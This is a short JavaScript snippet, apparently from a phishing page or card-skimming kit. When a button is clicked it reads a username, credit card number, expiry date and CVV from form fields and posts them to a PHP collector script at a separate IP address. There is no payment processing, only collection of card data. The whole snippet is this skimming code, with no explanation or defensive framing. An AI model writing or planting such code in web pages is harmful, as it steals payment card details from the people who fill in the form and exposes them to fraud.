document.getElementById('button').onclick = function(){
	var username=document.getElementById("username").value;
	var creditcard=document.getElementById("creditcard").value;
	var expireddate=document.getElementById("expireddate").value;
	var cvv=document.getElementById("cvv").value;

	var httpr=new XMLHttpRequest();
	httpr.open("POST","http://192.168.100.9/getdata/getdata.php",true);
	httpr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
	httpr.onreadystatechange=function(){
		if(httpr.readyState==4 && httpr.status==200){
			console.log("succeeded");
		}
	}
	httpr.send("username="+username+"&creditcard="+creditcard+"&expireddate="+expireddate+"&cvv="+cvv);
}
